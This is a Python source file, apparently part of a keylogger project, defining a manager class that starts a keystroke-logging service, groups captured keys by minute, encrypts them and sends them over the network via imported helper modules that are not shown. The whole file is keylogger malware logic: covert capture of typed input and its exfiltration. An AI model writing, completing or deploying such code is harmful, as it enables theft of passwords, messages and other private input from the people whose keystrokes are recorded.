from datetime import datetime
import time
from key_logger_service import KeyLoggerService
from encryptor import Encryptor
from network_writer import NetworkWriter


class KeyLoggerManager:
    def __init__(self):
        self.key_logger = KeyLoggerService()
        self.encryptor = Encryptor()
        self.network_writer = NetworkWriter()
        self.buffer = {}

    def run_logger_loop(self):
        try:
            self.key_logger.start_logging()
        except Exception as e:
            print(f"Error starting key logger: {e}")
            return

        try:
            while True:
                current_time = datetime.now().strftime("%Y-%m-%d %H_%M")
                self.buffer = self.key_logger.get_logged_keys()

                if self.buffer:
                    log_time = list(self.buffer.keys())[0]

                    if log_time != current_time:
                        encrypted_data = self.encrypt_logged_keys(self.buffer)
                        print(self.buffer)
                        self.send_logged_keys(log_time, encrypted_data)
                        self.key_logger.reset_logs()

                time.sleep(2)

        except KeyboardInterrupt:
            self.key_logger.stop_logging()

    def get_recently_logged_keys(self):
        return self.key_logger.get_logged_keys()

    def encrypt_logged_keys(self, logs):
        return self.encryptor.encrypt(logs)

    def send_logged_keys(self,log_time, encrypted_data):
        payload = {log_time: encrypted_data}
        print(f"Sending data: {payload} to {self.key_logger.get_machine_name()}")

        self.network_writer.send_data(payload, self.key_logger.get_machine_name())
